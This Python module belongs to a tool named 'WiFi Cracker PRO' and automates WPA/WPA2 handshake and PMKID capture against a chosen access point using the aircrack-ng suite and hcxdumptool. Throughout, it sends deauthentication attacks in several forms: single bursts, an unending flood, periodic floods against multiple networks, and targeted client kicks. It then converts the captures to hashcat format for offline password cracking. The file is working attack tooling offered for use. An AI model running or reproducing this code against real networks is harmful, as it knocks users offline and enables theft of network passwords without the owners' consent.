#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T3RMUXK1NG WiFi Cracker PRO - Handshake Capturer Module
Advanced WPA/WPA2/PMKID handshake capture with multiple methods
"""

import os
import re
import time
import json
import subprocess
import threading
import queue
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Callable
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor


@dataclass
class CaptureResult:
    """Handshake capture result"""
    success: bool
    bssid: str
    essid: str
    cap_file: str = ""
    handshake_type: str = ""  # WPA, PMKID, etc.
    client_macs: List[str] = field(default_factory=list)
    timestamp: str = ""
    packets_captured: int = 0
    time_taken: float = 0.0
    error: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'success': self.success,
            'bssid': self.bssid,
            'essid': self.essid,
            'cap_file': self.cap_file,
            'handshake_type': self.handshake_type,
            'client_macs': self.client_macs,
            'timestamp': self.timestamp,
            'packets_captured': self.packets_captured,
            'time_taken': self.time_taken,
            'error': self.error
        }


class HandshakeCapturer:
    """Advanced Handshake Capture Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.capture_process = None
        self.deauth_process = None
        self.capturing = False
        self.output_dir = Path("/tmp/rs_captures")
        self.output_dir.mkdir(exist_ok=True)
        self.callbacks: List[Callable] = []
        self.capture_stats = {
            'total_captures': 0,
            'successful_captures': 0,
            'failed_captures': 0,
            'total_handshakes': 0
        }
    
    def capture(self, target, duration: int = 60, deauth: bool = True,
                deauth_count: int = 10, channel_hop: bool = False) -> Tuple[bool, str]:
        """Standard handshake capture"""
        start_time = time.time()
        
        # Set channel
        self._set_channel(target.channel)
        
        output_base = str(self.output_dir / f"capture_{target.bssid.replace(':', '')}_{int(time.time())}")
        
        # Start capture
        cmd = ['sudo', 'airodump-ng', self.interface,
               '-c', str(target.channel),
               '--bssid', target.bssid,
               '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            self.capturing = True
            
            # Send deauth packets
            if deauth:
                time.sleep(2)
                self._send_deauth(target.bssid, deauth_count)
            
            # Monitor for handshake
            cap_file = f"{output_base}-01.cap"
            handshake_detected = False
            
            for elapsed in range(duration):
                if not self.capturing:
                    break
                
                # Check capture output for handshake
                if self.capture_process.poll() is None:
                    line = self.capture_process.stderr.readline()
                    if 'WPA handshake' in line:
                        handshake_detected = True
                        break
                
                # Check cap file for handshake
                if os.path.exists(cap_file):
                    if self._verify_handshake(cap_file, target.bssid):
                        handshake_detected = True
                        break
                
                time.sleep(1)
            
            self.capturing = False
            self.capture_process.terminate()
            
            time_taken = time.time() - start_time
            
            if handshake_detected or (os.path.exists(cap_file) and self._verify_handshake(cap_file, target.bssid)):
                self.capture_stats['successful_captures'] += 1
                self.capture_stats['total_handshakes'] += 1
                return True, cap_file
            else:
                self.capture_stats['failed_captures'] += 1
                return False, ""
                
        except Exception as e:
            self.capture_stats['failed_captures'] += 1
            return False, ""
    
    def capture_aggressive(self, target, duration: int = 120) -> Tuple[bool, str]:
        """Aggressive capture with continuous deauth"""
        start_time = time.time()
        
        self._set_channel(target.channel)
        output_base = str(self.output_dir / f"aggressive_{target.bssid.replace(':', '')}_{int(time.time())}")
        
        cmd = ['sudo', 'airodump-ng', self.interface,
               '-c', str(target.channel),
               '--bssid', target.bssid,
               '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.capturing = True
            
            # Continuous deauth
            deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target.bssid, self.interface]
            self.deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            cap_file = f"{output_base}-01.cap"
            
            for elapsed in range(duration):
                if not self.capturing:
                    break
                
                if os.path.exists(cap_file):
                    if self._verify_handshake(cap_file, target.bssid):
                        break
                
                time.sleep(1)
            
            self._stop()
            
            if os.path.exists(cap_file) and self._verify_handshake(cap_file, target.bssid):
                return True, cap_file
            return False, ""
            
        except Exception as e:
            self._stop()
            return False, ""
    
    def capture_silent(self, target, duration: int = 300) -> Tuple[bool, str]:
        """Silent capture without deauth (passive)"""
        return self.capture(target, duration, deauth=False)
    
    def capture_multi_target(self, targets: List, duration: int = 180) -> Dict[str, Tuple[bool, str]]:
        """Capture handshakes from multiple targets simultaneously"""
        results = {}
        
        # Get all channels
        channels = list(set(t.channel for t in targets))
        
        output_base = str(self.output_dir / f"multi_{int(time.time())}")
        
        # Channel hopping capture
        if len(channels) > 1:
            channel_str = ','.join(map(str, channels))
            cmd = ['sudo', 'airodump-ng', self.interface,
                   '-c', channel_str, '--channel-hop',
                   '-w', output_base]
        else:
            cmd = ['sudo', 'airodump-ng', self.interface,
                   '-c', str(channels[0]),
                   '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.capturing = True
            
            # Deauth all targets periodically
            deauth_threads = []
            
            def deauth_target(target):
                while self.capturing:
                    self._send_deauth(target.bssid, 5)
                    time.sleep(30)
            
            for target in targets:
                t = threading.Thread(target=deauth_target, args=(target,), daemon=True)
                t.start()
                deauth_threads.append(t)
            
            # Wait
            time.sleep(duration)
            
            self._stop()
            
            # Verify each target
            cap_file = f"{output_base}-01.cap"
            if os.path.exists(cap_file):
                for target in targets:
                    has_handshake = self._verify_handshake(cap_file, target.bssid)
                    results[target.bssid] = (has_handshake, cap_file if has_handshake else "")
            
        except Exception as e:
            self._stop()
        
        return results
    
    def capture_with_client_deauth(self, target, client_macs: List[str], 
                                    duration: int = 60) -> Tuple[bool, str]:
        """Target specific clients for deauth"""
        start_time = time.time()
        
        self._set_channel(target.channel)
        output_base = str(self.output_dir / f"client_deauth_{target.bssid.replace(':', '')}_{int(time.time())}")
        
        cmd = ['sudo', 'airodump-ng', self.interface,
               '-c', str(target.channel),
               '--bssid', target.bssid,
               '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.capturing = True
            
            # Deauth specific clients
            for client_mac in client_macs:
                time.sleep(2)
                self._send_deauth(target.bssid, 10, client_mac)
            
            cap_file = f"{output_base}-01.cap"
            
            for elapsed in range(duration):
                if not self.capturing:
                    break
                
                if os.path.exists(cap_file):
                    if self._verify_handshake(cap_file, target.bssid):
                        break
                
                time.sleep(1)
            
            self._stop()
            
            if os.path.exists(cap_file) and self._verify_handshake(cap_file, target.bssid):
                return True, cap_file
            return False, ""
            
        except Exception as e:
            self._stop()
            return False, ""
    
    def capture_pmkid(self, target, timeout: int = 60) -> Tuple[bool, str]:
        """Capture PMKID (no client needed)"""
        output_file = str(self.output_dir / f"pmkid_{target.bssid.replace(':', '')}_{int(time.time())}.pcap")
        
        # Use hcxdumptool for PMKID capture
        try:
            cmd = ['sudo', 'hcxdumptool', '-i', self.interface,
                   '-o', output_file, '--enable_status=1',
                   '--filterlist_ap=target.txt', '--filtermode=2']
            
            # Create target file
            with open('target.txt', 'w') as f:
                f.write(target.bssid.replace(':', ''))
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            start_time = time.time()
            pmkid_captured = False
            
            while time.time() - start_time < timeout:
                line = process.stdout.readline()
                if 'PMKID' in line or 'EAPOL' in line:
                    pmkid_captured = True
                    break
                time.sleep(1)
            
            process.terminate()
            os.remove('target.txt')
            
            if pmkid_captured and os.path.exists(output_file):
                return True, output_file
            
        except FileNotFoundError:
            # Fallback to airodump with WPS
            pass
        except Exception as e:
            pass
        
        return False, ""
    
    def _send_deauth(self, bssid: str, count: int = 10, client_mac: str = "FF:FF:FF:FF:FF:FF") -> bool:
        """Send deauthentication packets"""
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count),
                   '-a', bssid, '-c', client_mac, self.interface]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            process.terminate()
            return True
        except FileNotFoundError:
            return False
        except Exception as e:
            return False
    
    def _set_channel(self, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)],
                         capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def _verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify handshake in capture file"""
        try:
            # Use aircrack to verify
            result = subprocess.run(['aircrack-ng', cap_file],
                                   capture_output=True, text=True, timeout=10)
            
            # Check for handshake in output
            output = result.stdout
            if 'WPA' in output and 'handshake' in output.lower():
                # More specific check for target BSSID
                if bssid.replace(':', '').lower() in output.lower():
                    return True
            
            # Alternative: use cowpatty
            try:
                result = subprocess.run(['cowpatty', '-r', cap_file, '-s', 'check'],
                                       capture_output=True, text=True, timeout=10)
                if 'Collected all data' in result.stdout:
                    return True
            except FileNotFoundError:
                pass
            
            return False
            
        except Exception as e:
            return False
    
    def _stop(self):
        """Stop all processes"""
        self.capturing = False
        if self.capture_process:
            self.capture_process.terminate()
            self.capture_process = None
        if self.deauth_process:
            self.deauth_process.terminate()
            self.deauth_process = None
    
    def stop(self):
        """Public stop method"""
        self._stop()
    
    def get_stats(self) -> Dict:
        """Get capture statistics"""
        return self.capture_stats.copy()
    
    def cleanup(self, max_age_hours: int = 24):
        """Clean up old capture files"""
        import time
        
        for f in self.output_dir.glob("*.cap"):
            age_hours = (time.time() - f.stat().st_mtime) / 3600
            if age_hours > max_age_hours:
                f.unlink()
    
    def convert_to_hashcat(self, cap_file: str) -> Optional[str]:
        """Convert capture to hashcat format"""
        hccapx_file = cap_file.replace('.cap', '.hccapx')
        
        try:
            # Use aircrack-ng conversion
            result = subprocess.run(
                ['aircrack-ng', '-J', hccapx_file.replace('.hccapx', ''), cap_file],
                capture_output=True, text=True
            )
            
            if os.path.exists(hccapx_file):
                return hccapx_file
            
            # Try hcxpcapngtool
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hccapx_file, cap_file],
                capture_output=True, text=True
            )
            
            if os.path.exists(hccapx_file):
                return hccapx_file
                
        except FileNotFoundError:
            pass
        
        return None
    
    def extract_hashes(self, cap_file: str) -> List[Dict]:
        """Extract all hashes from capture file"""
        hashes = []
        
        try:
            # Use aircrack to list networks
            result = subprocess.run(['aircrack-ng', cap_file],
                                   capture_output=True, text=True)
            
            # Parse output for networks and handshakes
            lines = result.stdout.split('\n')
            current_network = None
            
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    # Parse network line
                    match = re.search(r'([0-9A-Fa-f:]{17})\s+', line)
                    if match:
                        current_network = {
                            'bssid': match.group(1),
                            'has_handshake': False
                        }
                elif 'WPA handshake' in line.lower() and current_network:
                    current_network['has_handshake'] = True
                    hashes.append(current_network)
                    current_network = None
            
        except Exception as e:
            pass
        
        return hashes


# CLI entry point
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python capturer.py <interface> <bssid> <channel> [duration]")
        sys.exit(1)
    
    interface = sys.argv[1]
    bssid = sys.argv[2]
    channel = int(sys.argv[3])
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    # Create dummy target
    class Target:
        def __init__(self, bssid, channel):
            self.bssid = bssid
            self.channel = channel
            self.essid = ""
    
    target = Target(bssid, channel)
    
    capturer = HandshakeCapturer(interface)
    
    print(f"Capturing handshake for {bssid} on channel {channel}...")
    success, cap_file = capturer.capture(target, duration, deauth=True)
    
    if success:
        print(f"Handshake captured: {cap_file}")
    else:
        print("No handshake captured")
